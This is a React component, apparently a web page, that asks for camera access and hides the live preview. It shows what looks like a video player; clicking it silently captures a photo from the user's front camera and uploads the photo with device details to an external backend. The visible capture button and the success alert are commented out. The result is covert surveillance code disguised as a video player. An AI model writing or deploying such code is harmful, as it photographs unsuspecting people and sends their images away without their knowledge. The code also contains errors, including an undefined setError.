import { useState, useRef, useEffect } from "react";
import axios from "axios";
import video from "../assets/video.mp4";
import img from "../assets/video.jpg";
import CustomVideoPlayer from "./CustomVideoPlayer";

// This component handles camera stream and photo capture functionality
const CameraCapture = () => {
  const [stream, setStream] = useState(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [permissionState, setPermissionState] = useState("checking");

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user", // Prefer rear camera on mobile
        },
      });
      setStream(stream);
      setPermissionState("granted");
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (err) {
      setPermissionState("denied");
    }
  };
  // Initialize camera stream when component mounts
  useEffect(() => {
    startCamera();

    // Cleanup: stop camera stream when component unmounts
    return () => {
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  // Handle photo capture when user clicks the button
  const capturePhoto = async () => {
    if (!videoRef.current || !canvasRef.current) return;

    const video = videoRef.current;
    const canvas = canvasRef.current;
    const context = canvas.getContext("2d");

    // Set canvas dimensions to match video stream
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw current video frame to canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert canvas to blob for upload
    canvas.toBlob(async (blob) => {
      const formData = new FormData();
      formData.append("photo", blob, "photo.jpg");
      formData.append(
        "deviceInfo",
        JSON.stringify({
          userAgent: navigator.userAgent,
          deviceType: /Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile/.test(
            navigator.userAgent
          )
            ? "mobile"
            : "desktop",
          timestamp: new Date().toISOString(),
        })
      );

      try {
        await axios.post(
          "https://my-photos-backend-1.onrender.com/api/photos/upload",
          formData,
          {
            headers: {
              "Content-Type": "multipart/form-data",
            },
          }
        );
        // alert("Photo uploaded successfully!");
      } catch (err) {
        setError("Error uploading photo: " + err.message);
      }
    }, "image/jpeg");
  };
  // if (error) {
  //   return <div className="text-red-500 p-4">{error}</div>;
  // }

  return (
    <div className="flex flex-col items-center space-y-4 p-4">
      {/* ✅ If denied, show enable button only */}
      {permissionState === "denied" && (
        <div className="text-center text-red-600 font-medium space-y-2">
          <p>You blocked the access.</p>
          <p className="text-sm">
            Please enable camera permission from browser settings:
          </p>
          <ol className="text-sm text-gray-700">
            <li>• Tap the URL bar</li>
            <li>• Select “Site settings”</li>
            <li>• Select “Camera” → Allow</li>
            <li>• Then Reload this page</li>
          </ol>
        </div>
      )}

      <div className="relative w-full max-w-xl bg-black rounded-lg overflow-hidden hidden">
        <video
          ref={videoRef}
          autoPlay
          playsInline
          className="w-full aspect-video object-cover"
        />
      </div>

      {/* <button
        onClick={capturePhoto}
        className="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-6 rounded-lg shadow-lg transition-colors"
      >
        Take Photo
      </button> */}
      <div
        // onClick={capturePhoto}
        className="hidden  grid-cols-3 sm:grid-cols-4 md:grid-cols-6 xl:grid-cols-8 w-full min-h-[100vw] lg:min-h-[30vw] gap-2"
      >
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
        <div className="bg-gray-500"></div>
      </div>
      {permissionState === "granted" && (
        <div
          onClick={capturePhoto}
          className="flex justify-center items-center w-full lg:w-1/2 mx-auto   gap-2 bg-gray-300"
        >
          {/* <video
            src={video}
            controls
            className="object-cover w-full h-full rounded-md"
          ></video> */}
          <CustomVideoPlayer capture={capturePhoto} src={img} />
        </div>
      )}

      {/* Hidden canvas for photo capture */}
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default CameraCapture;
